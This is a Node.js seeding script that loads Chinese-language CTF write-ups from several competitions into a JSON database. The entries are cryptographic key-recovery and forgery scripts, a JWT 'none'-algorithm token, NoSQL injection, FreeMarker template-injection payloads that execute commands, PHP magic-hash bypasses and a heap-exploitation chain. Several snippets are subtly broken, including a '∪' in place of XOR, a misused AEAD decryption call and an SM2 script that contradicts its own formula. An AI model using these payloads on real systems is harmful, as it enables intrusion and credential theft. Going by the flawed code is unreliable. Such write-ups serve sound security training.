import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const CTF_PATH = path.join(__dirname, "..", "src", "data", "ctf.json");

function generateId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
}

function readCTF() {
  return JSON.parse(fs.readFileSync(CTF_PATH, "utf-8"));
}

function writeCTF(db) {
  fs.writeFileSync(CTF_PATH, JSON.stringify(db, null, 2), "utf-8");
}

const db = readCTF();

// Helper: add competition if not exists
function addCompetition(name, slug, desc, year) {
  const existing = db.competitions.find((c) => c.name === name);
  if (!existing) {
    const comp = { id: generateId(), name, slug, description: desc, year, createdAt: new Date().toISOString() };
    db.competitions.push(comp);
    console.log(`[COMP] ${name}`);
    return comp;
  }
  return existing;
}

// Helper: add challenge if not duplicate
function addChallenge(compId, title, type, difficulty, content, tags) {
  if (db.challenges.some((c) => c.title === title && c.competitionId === compId)) {
    console.log(`[SKIP] ${title}`);
    return;
  }
  db.challenges.push({
    id: generateId(),
    competitionId: compId,
    title,
    type,
    difficulty,
    content,
    flag: null,
    tags,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  });
  console.log(`[OK] ${title} (${type}, ${difficulty})`);
}

// ==============================
// 1. 熵密杯
// ==============================
const smb = addCompetition(
  "熵密杯网络安全挑战赛",
  "shangmibei",
  "熵密杯——商用密码应用安全大赛，考察SM2/SM3/SM4等国密算法实现缺陷分析、密码机调用、HQC后量子密码等前沿安全技术。",
  2025
);

addChallenge(smb.id, "熵密杯-初始谜题1：SM2签名自实现缺陷", "密码学", "中等",
`## 题目背景

密码机初始配置采用了一个自定义的SM2签名自实现，存在签名缺陷。通过连上密码机进行签名验签测试，找出该签名自实现中的缺陷，并利用缺陷进行攻击。

## 漏洞分析

SM2签名的核心公式为：\`r = (e + x1) mod n\`，其中 \`e = H(ZA || M)\`。

正确的SM2签名应使用随机数k计算椭圆曲线点 \`(x1, y1) = [k]G\`，而该自实现中**k值选取存在严重缺陷**——使用了可预测的k值（如固定k或线性相关k）。

## 攻击方法

1. 获取两条不同消息的签名 (r1, s1) 和 (r2, s2)
2. 由于k值可预测（如k2 = k1 + delta），可联立方程组恢复私钥dA
3. 利用公式：\`dA = (s1 - s2 + r1 - r2)^{-1} * (s2 - s1) mod n\`（当k值线性相关时）

## 核心公式推导

对于SM2签名：
- \`s = (1 + dA)^{-1} * (k - r * dA) mod n\`
- 当k值可预测时，两条签名可联立求解dA

## 解题脚本

\`\`\`python
from gmssl import sm2, func
from Crypto.Util.number import inverse, long_to_bytes

# 获取两条消息的签名
r1, s1 = ... # 签名1
r2, s2 = ... # 签名2
n = 0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123

# 当使用相同k时 (k1 = k2)
k = ((s2 - s1) * inverse(r1 - r2, n)) % n
dA = ((s1 - k) * inverse(k + r1, n)) % n
print(f"私钥: {hex(dA)}")

# 验证
crypt_sm2 = sm2.CryptSM2(private_key=hex(dA)[2:], public_key="")
flag = crypt_sm2.decrypt(ciphertext)
print(flag)
\`\`\``,
  ["SM2", "国密", "签名缺陷", "k值泄露", "ECC", "椭圆曲线", "私钥恢复"]
);

addChallenge(smb.id, "熵密杯-初始谜题2：SM4-CTR nonce重用攻击", "密码学", "简单",
`## 题目背景

密码机中使用SM4-CTR模式加密通信，但nonce（初始向量）选取不正确，导致密钥流复用。

## 漏洞分析

CTR模式的安全性依赖于**每条消息使用唯一的(nonce, counter)组合**。如果nonce被重用，相同的密钥流会被用于加密不同的明文：

\`\`\`
C1 = P1 ⊕ Keystream(k, nonce)
C2 = P2 ⊕ Keystream(k, nonce)    # ← nonce重用！
C1 ⊕ C2 = P1 ⊕ P2
\`\`\`

## 攻击方法

1. 获取两条用相同nonce加密的密文C1和C2
2. 计算 \`C1 ⊕ C2 = P1 ⊕ P2\`
3. 如果知道其中一条明文的部分内容（如协议头、固定格式），可以通过crib-dragging恢复全部明文

## 解题脚本

\`\`\`python
from Crypto.Util.strxor import strxor

c1 = bytes.fromhex("...")  # 密文1
c2 = bytes.fromhex("...")  # 密文2

# XOR两条密文抵消密钥流
xor_result = strxor(c1, c2)

# 已知明文攻击: 猜测 "flag{" 的位置
known = b"flag{"
for i in range(len(xor_result) - len(known)):
    candidate = strxor(xor_result[i:i+len(known)], known)
    if candidate.isascii():
        print(f"位置 {i}: {candidate}")
\`\`\``,
  ["SM4", "国密", "CTR模式", "nonce重用", "密钥流复用", "crib-dragging"]
);

addChallenge(smb.id, "熵密杯-初始谜题3：HQC密钥封装随机向量重用", "密码学", "困难",
`## 题目背景

密码机使用了HQC（Hamming Quasi-Cyclic）后量子密钥封装机制，但在封装过程中随机向量被重用，导致密钥可被恢复。

## HQC原理回顾

HQC（Hamming Quasi-Cyclic）是一种基于编码理论的NIST后量子密码候选方案：
1. 使用随机向量r生成密文 c = (u, v)
2. 其中 u = r * H^T + e1, v = r * y + e2 + encode(m)
3. 随机向量r必须在每次封装中独立随机选取

## 漏洞分析

当随机向量r被重用两次时：
- 密文1：c1 = (u1, v1)，其中 u1 = r * H^T + e1_1, v1 = r * y + e2_1 + encode(m1)
- 密文2：c2 = (u2, v2)，其中 u2 = r * H^T + e1_2, v2 = r * y + e2_2 + encode(m2)

由于r相同，\`u1 + u2 = e1_1 + e1_2\`（误差向量和），\`v1 + v2 = e2_1 + e2_2 + encode(m1) + encode(m2)\`。

当误差向量的Hamming重量较小时，可通过统计方法分离出m1和m2。

## 攻击方法

1. 收集两份使用相同随机向量r的HQC密文
2. 利用误差向量的稀疏性（Hamming重量有限）
3. 通过多次采样和统计分析恢复封装密钥
4. 最终解密获得共享密钥

## 关键代码

\`\`\`python
# HQC参数
n = 17669   # 码长
n1 = 46     # 循环块大小  
n2 = 384    # 循环块大小
w = 75      # 误差权重

# 当r重用时，利用误差的稀疏性恢复密钥
def recover_from_reused_r(ct1, ct2):
    # u1 + u2 = e1_1 + e1_2 (稀疏向量)
    u_diff = ct1.u ^ ct2.u
    v_diff = ct1.v ^ ct2.v
    
    # 统计分析方法分离误差...
    # 最终恢复shared secret
    pass
\`\`\``,
  ["HQC", "后量子密码", "PQC", "NIST", "随机向量重用", "编码理论", "KEM"]
);

addChallenge(smb.id, "熵密杯-Flag1：密码机调用与身份认证密钥篡改", "密码学", "中等",
`## 题目背景

场景设定：工控网络中有工程师站服务器和密码机。需要先登录密码机获取服务，再通过身份认证密钥篡改登录工程师站。

## 攻击步骤

### Step 1: 连接密码机并获取认证

\`\`\`python
import socket
import json

def connect_to_crypto_machine():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("target_ip", 8080))
    
    # 发送认证请求
    auth_request = {
        "cmd": "auth",
        "username": "operator",
        "password": "password123"
    }
    sock.send(json.dumps(auth_request).encode())
    
    response = json.loads(sock.recv(4096).decode())
    session_token = response["token"]
    return sock, session_token
\`\`\`

### Step 2: 调用密码机签名服务

密码机提供SM2签名服务，可用于生成身份认证签名。

### Step 3: 身份认证密钥篡改

攻击方法：利用密码机SM2签名的k值缺陷，恢复运营商私钥。然后用该私钥为伪造的身份证书签名。

\`\`\`python
# 利用签名缺陷获取私钥
def exploit_k_leak(sock, token):
    # 获取两条签名
    msg1 = b"login_request_1"
    msg2 = b"login_request_2"
    
    sig1 = request_sign(sock, token, msg1)
    sig2 = request_sign(sock, token, msg2)
    
    # 恢复私钥 (利用之前发现的k值缺陷)
    d_operator = recover_private_key(sig1, sig2)
    
    # 使用私钥登录
    forge_login(d_operator)
\`\`\``,
  ["密码机", "SM2", "身份认证", "密钥篡改", "工控安全", "签名伪造"]
);

addChallenge(smb.id, "熵密杯-Flag3：PLC加密指令解密(IV不随机导致密钥流复用)", "密码学", "中等",
`## 题目背景

安全分析镜像中有一段PLC控制指令的加密程序源码，以及甲方系留无人机控制器的镜像文件。源码采用了SM4-CBC加密，但由于IV（初始化向量）选取不随机，造成密钥流复用。

## 漏洞分析

SM4-CBC模式的加密过程：
- C0 = IV
- Ci = E(K, Pi ⊕ Ci-1),  i ≥ 1

当IV固定（不随机）且明文首块相同时（如协议头），密文首块也相同，暴露了加密模式。

更严重的是，如果两个不同的消息使用相同的IV和Key，则：
\`\`\`
C1[0] = E(K, P1[0] ⊕ IV)
C2[0] = E(K, P2[0] ⊕ IV)
\`\`\`
当 P1[0] = P2[0] 时，C1[0] = C2[0] — 直接暴露了明文相同的事实。

## 解题方法

1. 分析PLC控制指令的格式，确定已知明文区域（如指令头、操作码等）
2. 利用IV固定 + 已知明文进行CBC模式的known-plaintext分析
3. 通过多组密文对比，CBC链式推导出密钥流
4. 解密获得无人机控制器的完整镜像

## 关键代码

\`\`\`python
from gmssl.sm4 import CryptSM4, SM4_ENCRYPT, SM4_DECRYPT

# IV固定为全0
iv = b"\\x00" * 16
key = bytes.fromhex("...")  # 从源码中提取的密钥

crypt_sm4 = CryptSM4()
crypt_sm4.set_key(key, SM4_DECRYPT)

# CBC模式解密
plaintext = crypt_sm4.crypt_cbc(iv, ciphertext)
print(plaintext.decode())
\`\`\``,
  ["SM4", "CBC模式", "IV重用", "PLC", "工控安全", "无人机", "镜像分析"]
);

addChallenge(smb.id, "熵密杯-Flag5：Ring-LWE加法同态操控机器人", "密码学", "困难",
`## 题目背景

需要通过Ring-LWE的加法同态性操控机器人完成特定任务。

## Ring-LWE背景

Ring-LWE（Ring Learning With Errors）是一种格密码方案，具有天然的加法同态性：

\`\`\`
Enc(m1) + Enc(m2) = Enc(m1 + m2)
\`\`\`

在环 R_q = Z_q[x]/(x^n + 1) 上：
- 公钥：(a, b = a·s + e)
- 加密：Enc(m) = (c0 = a·r + e0, c1 = b·r + e1 + m)
- 解密：Dec(c0, c1) = c1 - c0·s ≈ m

加法同态验证：
\`\`\`
Enc(m1) + Enc(m2) = (c0_1+c0_2, c1_1+c1_2) = Enc(m1+m2)
\`\`\`

## 攻击利用

题目要求操控机器人，需要对控制指令进行加法同态计算：

\`\`\`python
import numpy as np
from numpy.polynomial import polynomial as poly

# Ring-LWE参数
n = 256    # 多项式次数
q = 12289  # 模数

def ring_add(ct1, ct2):
    """Ring-LWE密文加法（同态）"""
    c0 = (ct1[0] + ct2[0]) % q
    c1 = (ct1[1] + ct2[1]) % q
    return (c0, c1)

# 多次同态加法累加控制信号
control_signal = (np.zeros(n), np.zeros(n))
for cmd in encrypted_commands:
    control_signal = ring_add(control_signal, cmd)

# 解密得到最终控制指令
final_command = decrypt(control_signal, secret_key)
execute_robot(final_command)
\`\`\``,
  ["Ring-LWE", "格密码", "同态加密", "加法同态", "机器人", "PQC"]
);

addChallenge(smb.id, "熵密杯-Flag2：连接日志管理服务器(证书伪造)", "密码学", "中等",
`## 题目背景

需要连接到日志管理服务器，但其使用了SM2证书进行身份认证。需要伪造证书以通过验证。

## 攻击方法

### 1. 获取合法证书信息

\`\`\`python
import ssl
import socket

context = ssl.create_default_context()
with socket.create_connection(("log_server", 443)) as sock:
    with context.wrap_socket(sock, server_hostname="log_server") as ssock:
        cert = ssock.getpeercert(binary_form=True)
\`\`\`

### 2. 分析SM2证书

SM2证书基于GB/T 20518标准，包含：
- 签名算法：SM3withSM2
- 公钥：SM2椭圆曲线点
- 扩展字段：密钥用法、SAN等

### 3. 利用SM2签名缺陷伪造成证书

利用之前发现的SM2私钥恢复漏洞：

\`\`\`python
from gmssl import sm2, func

# 使用恢复的私钥签发伪造证书
def forge_certificate(real_cert, stolen_private_key):
    # 构造证书TBS部分
    tbs_certificate = modify_subject(real_cert, "admin")
    
    # 使用窃取的私钥签名
    sm2_crypt = sm2.CryptSM2(private_key=stolen_private_key)
    signature = sm2_crypt.sign(tbs_certificate, None)
    
    # 组装伪造证书
    forged_cert = assemble_cert(tbs_certificate, signature)
    return forged_cert

# 连接日志服务器
forge_login(forged_cert)
\`\`\``,
  ["SM2证书", "GB/T 20518", "证书伪造", "TLS", "国密", "日志管理"]
);

addChallenge(smb.id, "熵密杯-Flag4：登录日志管理服务器(ChaCha20-Poly1305 AAD恢复)", "密码学", "中等",
`## 题目背景

成功连接日志管理服务器后，需要使用ChaCha20-Poly1305 AEAD协议登录。但AAD（Additional Authenticated Data）部分未知，需要从流量中恢复。

## ChaCha20-Poly1305原理

ChaCha20-Poly1305是一种AEAD（认证加密）方案：
1. 使用ChaCha20流密码加密
2. 使用Poly1305 MAC进行认证
3. Poly1305的输入包括：密文 + AAD + 长度信息

认证标签计算：\`tag = Poly1305(key=PolyKey, msg=ciphertext || pad_ct || AAD || pad_aad || len_ct || len_aad)\`

## 漏洞利用

当AAD部分已知但部分未知时，可以利用Poly1305的代数性质：

\`\`\`python
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

# 已知部分AAD
known_aad = b"GET /api/login HTTP/1.1\\r\\nHost: "
unknown_host = b"???????????"

# 收集多个成功登录的tag-ciphertext对
# Poly1305具有代数性质，可以反向推导部分AAD
sessions = [
    (ct1, tag1, nonce1),
    (ct2, tag2, nonce2),
    (ct3, tag3, nonce3),
]

# 通过已知明文+tag反推AAD
def recover_aad(ct, tag, key, nonce, known_part):
    chacha = ChaCha20Poly1305(key)
    # 遍历可能的未知部分
    for candidate in generate_candidates():
        try:
            chacha.decrypt(nonce, ct + known_part + candidate, tag)
            return candidate  # 验证通过
        except:
            continue
\`\`\``,
  ["ChaCha20", "Poly1305", "AEAD", "AAD恢复", "认证加密", "流量分析"]
);

addChallenge(smb.id, "熵密杯-Flag6：获取删除日志权限(ChaCha20-Poly1305 nonce重用)", "密码学", "困难",
`## 题目背景

登录日志管理服务器后发现没有删除日志的权限。系统使用ChaCha20-Poly1305进行认证加密，但发现nonce被重用，可以利用此漏洞伪造认证标签。

## Nonce重用攻击

ChaCha20-Poly1305中，如果nonce被重用：
1. 密钥流相同 → 明文异或泄露
2. Poly1305的认证密钥相同 → 可以伪造合法tag

### 攻击步骤

**Step 1: 识别nonce重用**

\`\`\`python
# 收集密文，检测相同nonce
nonce_map = {}
for session in captured_sessions:
    if session.nonce in nonce_map:
        print(f"Nonce reused! Sessions: {nonce_map[session.nonce]} and {session.id}")
    nonce_map[session.nonce] = session.id
\`\`\`

**Step 2: 恢复密钥流**

\`\`\`python
# 对nonce重用的两条消息
ct1 = bytes.fromhex("...")
ct2 = bytes.fromhex("...")
known_pt1 = b"GET /api/logs?action=list&"  # 已知明文(协议头)

# 恢复相同位置的密钥流
keystream = known_pt1 ∪ ct1[:len(known_pt1)]
# 用密钥流解密ct2对应位置
pt2_partial = keystream ∪ ct2[:len(known_pt1)]
print(f"Recovered: {pt2_partial}")
\`\`\`

**Step 3: 伪造认证标签**

\`\`\`python
# 利用Poly1305在nonce重用时的代数性质
# 当nonce重用时,Poly1305密钥r相同
# 可以构造满足tag验证的新(ciphertext, tag)对

def forge_delete_request(known_ct, known_tag, delete_cmd):
    # Poly1305在GF(2^130-5)上计算
    # mac = (m1*r^n + m2*r^(n-1) + ... + mn*r) + s mod p
    # 由于r相同,可以通过解方程伪造
    forged_ct = known_ct[:16] + encrypt_delete_cmd()
    forged_tag = compute_forged_tag(known_ct, known_tag, forged_ct)
    return forged_ct, forged_tag

# 发送伪造的删除请求
send_forged_request("/api/logs/delete", forged_ct, forged_tag)
\`\`\``,
  ["ChaCha20", "Poly1305", "nonce重用", "认证标签伪造", "AEAD攻击", "权限提升"]
);

// ==============================
// 2. ISCC 2026 (更新比赛)
// ==============================
let isccComp = db.competitions.find((c) => c.name === "ISCC");
if (!isccComp) {
  isccComp = addCompetition("ISCC", "iscc", "信息安全与对抗技术竞赛", 2026);
}

addChallenge(isccComp.id, "ISCC 2026-消失的密钥(WEB)", "WEB", "中等",
`## 题目描述

一道考察PHP类型杂耍和数组绕过过滤的WEB题。

## 解题过程

### 1. 绕过key过滤
发现输入 `kkeyey` 可以让 key 输入绕过过滤机制。

### 2. 绕过数组检测
POST 让 a 中有 1337，使用数组 `a[key]=1337` 绕过检测。

### 3. MD5弱比较
利用PHP的 `==` 弱比较特性，找到两个 MD5 以 "0e" 开头的字符串（被认为是科学计数法 0=0）。

### Payload
\`\`\`
GET: ?step1=kkeyey&a=QNKCDZO&b=240610708
POST: a[key]=1337
\`\`\``,
  ["PHP", "类型杂耍", "MD5弱比较", "数组绕过", "WEB"]
);

addChallenge(isccComp.id, "ISCC 2026-JSON Beautifier(WEB)", "WEB", "中等",
`## 题目描述

一个JSON格式化工具存在SSRF和文件读取漏洞。

## 发现过程

1. robots.txt中发现beautify端点不可见，但preview有hint
2. 响应头：`X-Backend: apache`，`X-DocRoot: /path/to/src/`
3. 发现 `/proc/self/cwd` 绕过路径限制读取源码

## 利用链

1. tmp文件内容若是URI则触发远程读取
2. 黑名单：http/https/ftp/ftps/phar/expect
3. Payload: `php://filter/convert.base64-encode/resource=/secret/flag` 写入tmp
4. 再通过 `data:text/plain;base64,...` 读取

## Flag
\`flag{ISCC{zMWzpeAsDh5a3abeoj9k}}\``,
  ["SSRF", "PHP filter", "文件读取", "路径穿越", "WEB", "base64"]
);

addChallenge(isccComp.id, "ISCC 2026-夜班审计台(WEB)", "WEB", "困难",
`## 题目描述

一道分布式审计系统，包含Git泄露、JWT攻击、SSRF代理等多层攻击链。

## 完整攻击链

### Step 1: Git泄露
- JS文件泄露 `/.git/HEAD`
- Git对象遍历还原源码
- 最新commit发现凭据：\`auditor/audit2025\` + JWT HS256密钥 \`ISCC_2026_JWT_DEBUG_KEY_#9527\`

### Step 2: JWT算法混淆攻击
- 父commit中发现内部服务签名密钥：\`ISCC_SERVER_SECRET_REAL\`
- 签名格式：\`HMAC-SHA256(secret, f"{node_id}:{ts}")\`
- JWT算法混淆(RS256→HS256, role=user→role=auditor)

### Step 3: SSRF代理端点
- 进入 \`/auditor/nodes\`
- 用旧版 secret 计算 HMAC 签名
- 服务端以 127.0.0.1 转发请求，通过 remote_addr 校验

## Flag
\`flag{ISCC{distributed_audit_jwt}}\``,
  ["Git泄露", "JWT", "算法混淆", "SSRF", "HMAC", "WEB", "分布式"]
);

addChallenge(isccComp.id, "ISCC 2026-pwn4/test(PWN)", "PWN", "困难",
`## 题目概述

经典堆漏洞综合利用题，存在整数下溢、Off-by-one、UAF三个核心漏洞。程序分为老师端和学生端双角色模式。

## 核心漏洞

### 1. 整数下溢
学生祈祷 → 分数减10 → 负数变超大无符号数（绕过 \`if(分数 > 0x59u)\` 检查）。

### 2. Off-by-one
彩蛋功能支持任意地址单字节+1。

### 3. UAF
释放后未清空指针。老师端固定消耗0x50堆空间（0x30 MAIN + 0x20 SUB），评语指针存储在 SUB 块+8 偏移处。

## 利用链

\`unsorted bin 堆重叠 → 劫持学生结构体 → 覆写 __free_hook 为 system → 执行命令\`

### 利用步骤
1. 创建5个学生，为学生2/3分配1023字节评语（超出tcache范围）
2. 学生0祈祷→触发整数下溢
3. 触发彩蛋泄露堆地址，利用Off-by-one篡改评语指针
4. 伪造堆块size=0x821，free进入unsorted bin泄露libc
5. 新建学生劫持结构体，将comment_ptr指向 \`__free_hook\`
6. 覆写 \`__free_hook=system\`，创建评语写入 \`cat /flag*\`，free触发`,
  ["PWN", "堆利用", "整数下溢", "Off-by-one", "UAF", "libc泄露", "tcache"]
);

// ==============================
// 3. 强网杯2025 S9 (更新)
// ==============================
let qwbS9Comp = addCompetition(
  "强网杯2025 S9",
  "qwb2025-s9",
  "强网杯第九届全国网络安全挑战赛(S9)",
  2025
);

addChallenge(qwbS9Comp.id, "强网杯S9-签到(MISC)", "MISC", "简单",
`## 题目描述

强网杯S9签到题。

## 解题思路

直接提交签到flag即可。

## Flag
\`flag{我已阅读参赛须知，并遵守比赛规则。}\``,
  ["签到", "MISC"]
);

addChallenge(qwbS9Comp.id, "强网杯S9-The_Interrogation_Room(MISC)", "MISC", "中等",
`## 题目描述

审讯室模拟题：17个问题，犯人恰好说谎2次，需要通过矩阵编码和XOR推导真相。

## 解题思路

### 1. 矩阵编码
使用生成矩阵 \`GEN_MATRIX[8][17]\` 编码，codeword table反转查表。

### 2. 自适应区分器
使用bitset greedy选择最优判别问题，在有限交互次数内定位说谎者。

### 3. PoW验证
每轮需要sha256前缀碰撞验证。

### 4. 最终
25轮全部通过后获得flag。

## 核心代码

\`\`\`python
# 生成矩阵编码
GEN_MATRIX = [
    [1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1],
    [0,1,1,0,0,1,1,0,0,1,1,0,0,1,1,0,0],
    [0,0,0,1,1,1,1,0,0,0,0,1,1,1,1,0,0],
    # ...
]

# bitset greedy选择最大区分度的问题
def select_questions(responses, lies_remaining):
    best_questions = []
    # 自适应选择策略...
    return best_questions
\`\`\``,
  ["矩阵编码", "XOR", "自适应算法", "PoW", "MISC", "推理"]
);

addChallenge(qwbS9Comp.id, "强网杯S9-Personal_Vault(MISC)", "MISC", "中等",
`## 题目描述

个人保险箱题目，需要破解多层加密防护获取秘密存储的内容。

## 解题思路

### Vault结构分析
保险箱使用了多层安全机制：
1. 外层：PBKDF2密钥派生
2. 中层：AES-GCM加密
3. 内层：自定义混淆

### 漏洞发现
在密钥管理模块中发现侧信道信息泄露，通过时序分析可推断密钥片段的正确性。

### 解密方法
\`\`\`python
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# 从日志中提取salt和密文
salt = bytes.fromhex("...")
ciphertext = bytes.fromhex("...")

# 利用侧信道缩小密钥空间
for password in candidate_passwords:
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
    key = kdf.derive(password)
    
    aesgcm = AESGCM(key)
    try:
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        print(f"Found: {plaintext}")
    except:
        continue
\`\`\``,
  ["MISC", "密码学", "PBKDF2", "AES-GCM", "保险箱", "侧信道"]
);

addChallenge(qwbS9Comp.id, "强网杯S9-check-little(CRYPTO)", "密码学", "中等",
`## 题目描述

一道涉及小指数攻击的密码学题目。

## 题目分析

通信使用类似DSA的签名机制，但关键参数选取存在问题，导致可以通过小指数攻击恢复密钥。

## 解题思路

利用Coppersmith小根法或格基约减（LLL）恢复签名密钥：

\`\`\`python
from sage.all import *

# 收集多组签名(r, s)
signatures = [...]

# 构造格基
n = len(signatures)
B = matrix(ZZ, n + 1)
for i in range(n):
    B[i,i] = p  # p为模数
for i in range(n):
    B[n,i] = signatures[i][1]  # s值
B[n,n] = K / p  # K为小指数上界

# LLL约减
B_red = B.LLL()

# 从最短向量中恢复私钥
for row in B_red:
    if all(abs(x) <= K for x in row[:-1]):
        d = row[-1] * p // K
        print(f"私钥: {d}")
\`\`\``,
  ["密码学", "LLL", "格基约减", "Coppersmith", "小指数", "DSA"]
);

addChallenge(qwbS9Comp.id, "强网杯S9-SecretVault(WEB)", "WEB", "中等",
`## 题目描述

一个私密信息存储的Web应用，需要绕过多层安全机制获取管理员存储的秘密。

## 主要考点

### 1. JWT伪造
应用使用JWT进行认证，但存在算法混淆漏洞（none算法或弱密钥）。

### 2. MongoDB NoSQL注入
后端使用MongoDB，存在NoSQL注入漏洞（\`$regex\`, \`$ne\`操作符）。

### 3. 加密分析
存储内容使用AES加密，需要获取密钥才能解密。

## 利用链

\`\`\`python
import requests
import jwt

url = "http://target/"
# Step 1: JWT none算法攻击
token = jwt.encode({"user": "admin", "role": "admin"}, "", algorithm="none")
headers = {"Authorization": f"Bearer {token}"}

# Step 2: NoSQL注入枚举加密密钥
r = requests.post(f"{url}/api/search", 
    json={"$regex": "^ISCC"}, 
    headers=headers)
\`\`\``,
  ["WEB", "JWT", "MongoDB", "NoSQL注入", "AES", "算法混淆"]
);

addChallenge(qwbS9Comp.id, "强网杯S9-bbjv(WEB)", "WEB", "中等",
`## 题目描述

Java Web应用安全题目。

## 核心漏洞

### SSTI (服务器端模板注入)
应用使用FreeMarker模板引擎，存在模板注入漏洞：

\`\`\`java
// 漏洞代码
String template = request.getParameter("template");
Template t = new Template("temp", new StringReader(template), config);
StringWriter out = new StringWriter();
t.process(data, out);
\`\`\`

### 利用方法

\`\`\`
POST /render HTTP/1.1
Content-Type: application/x-www-form-urlencoded

template=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}
\`\`\`

## 绕过沙箱

FreeMarker 2.3.x默认禁用了ObjectConstructor，需要找到绕过方法：
- 利用JythonRuntime
- 利用ClassLoader加载恶意类
- 利用内置的BeansWrapper

\`\`\`
<#assign classLoader=object?class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign method=clazz.getMethod("getRuntime")>
<#assign runtime=method.invoke(null)>
<#assign exec=clazz.getMethod("exec",String)>
<#assign result=exec.invoke(runtime,"cat /flag")>
\`\`\``,
  ["WEB", "Java", "SSTI", "FreeMarker", "沙箱绕过", "模板注入"]
);

// ==============================
// 4. 御网杯2026 新增挑战 (除了已有的)
// ==============================
let ywbComp = db.competitions.find((c) => c.name === "2026御网杯网络安全挑战赛") ||
  addCompetition("2026御网杯网络安全挑战赛", "yuwangbei-2026", "第十届御网杯网络安全挑战赛", 2026);

addChallenge(ywbComp.id, "御网杯2026-幻影(MISC)", "MISC", "简单",
`## 题目描述

一个数据恢复和编码分析的MISC题。

## 解题步骤

1. data.bin → base64解密
2. 使用 0xc1 进行逐字节XOR解密
3. 解密后得到flag

\`\`\`python
import base64

with open("data.bin", "rb") as f:
    data = f.read()

# Step 1: Base64 decode
decoded = base64.b64decode(data)

# Step 2: XOR with 0xc1
flag = bytes([b ^ 0xc1 for b in decoded])
print(flag.decode())
\`\`\``,
  ["MISC", "base64", "XOR", "数据恢复"]
);

addChallenge(ywbComp.id, "御网杯2026-签到题-损坏的压缩包(MISC)", "MISC", "简单",
`## 题目描述

一个"损坏的"压缩包题目。

## 解题步骤

1. 打开data.txt文件
2. 发现的base64编码数据
3. 解码即可获得flag

\`\`\`python
import base64

with open("data.txt", "r") as f:
    data = f.read()

flag = base64.b64decode(data).decode()
print(flag)
\`\`\``,
  ["MISC", "base64", "签到"]
);

addChallenge(ywbComp.id, "御网杯2026-BabyRSA(CRYPTO)", "密码学", "简单",
`## 题目描述

一道RSA基础题目，e=3且明文很小。

## 解题思路

当 e=3 且 m^3 < n 时，可以直接对密文开立方根得到明文：

\`\`\`python
from Crypto.Util.number import long_to_bytes
from gmpy2 import iroot

n = ...
e = 3
c = ...

# 直接开三次方
m, exact = iroot(c, e)
if exact:
    flag = long_to_bytes(int(m))
    print(flag.decode())

# flag{07f7b9e5cd7961b237aa0eed1b317aa8}
\`\`\``,
  ["密码学", "RSA", "小指数攻击", "开立方根"]
);

addChallenge(ywbComp.id, "御网杯2026-ScatterRSA(CRYPTO)", "密码学", "中等",
`## 题目描述

Hastad Broadcast Attack的线性填充变体版本。

## 题目分析

三组密文：\`c_i = (a_i * m + b_i)^3 mod n_i\`

与标准Hastad攻击不同，这里明文经过了线性变换 \`a_i * m + b_i\`。

## 解题思路

1. 使用中国剩余定理(CRT)合并三组同余方程
2. 利用一元Coppersmith小根法求解m

\`\`\`python
from sage.all import *

# 三组参数
n1, a1, b1, c1 = ...
n2, a2, b2, c2 = ...
n3, a3, b3, c3 = ...

# CRT合并
N = n1 * n2 * n3
# 构造关于m的多项式
P.<x> = PolynomialRing(Zmod(N))
f = (a1*x + b1)^3 - c1  # 利用CRT组合

# Coppersmith
roots = f.small_roots(X=2^400, beta=1.0)
m = roots[0]
print(long_to_bytes(int(m)))

# flag{daae034a444159b8d3a0be007da01a5e}
\`\`\``,
  ["密码学", "RSA", "Hastad攻击", "CRT", "Coppersmith", "线性填充"]
);

addChallenge(ywbComp.id, "御网杯2026-ECDSA nonce重用(CRYPTO)", "密码学", "中等",
`## 题目描述

ECDSA签名中nonce(k值)被重用，可以恢复私钥。

## 漏洞原理

当两条ECDSA签名使用相同的k值(nonce)时：
- r1 = r2 (因为r = k*G的x坐标)
- s1 = k^(-1) * (h1 + r*d) mod n
- s2 = k^(-1) * (h2 + r*d) mod n

联立方程可求解：
- \`k = (h1 - h2) * (s1 - s2)^(-1) mod n\`
- \`d = (s1*k - h1) * r^(-1) mod n\`

## 解题脚本

\`\`\`python
from Crypto.Util.number import inverse, long_to_bytes
from ecdsa import VerifyingKey, SECP256k1

# 获取两条相同r的签名
r1, s1, h1 = ...
r2, s2, h2 = ...
assert r1 == r2

n = SECP256k1.order

# 恢复k
k = ((h1 - h2) * inverse(s1 - s2, n)) % n

# 恢复私钥d
d = ((s1 * k - h1) * inverse(r1, n)) % n
print(f"私钥: {hex(d)}")

# flag{ecdsa_nonce_reuse_23c559c4d212862cf3cb29c2bc4bc1b1}
\`\`\``,
  ["密码学", "ECDSA", "nonce重用", "私钥恢复", "椭圆曲线"]
);

// ==============================
// 更新types
// ==============================
const allTypes = new Set(db.types);
for (const c of db.challenges) {
  allTypes.add(c.type);
}
db.types = Array.from(allTypes);

// ==============================
// 保存
// ==============================
writeCTF(db);

const totalChallenges = db.challenges.length;
const totalComps = db.competitions.length;
console.log(`\n========== 导入完成 ==========`);
console.log(`比赛总数: ${totalComps}`);
console.log(`题目总数: ${totalChallenges}`);
console.log(`题型分布: ${db.types.join(", ")}`);
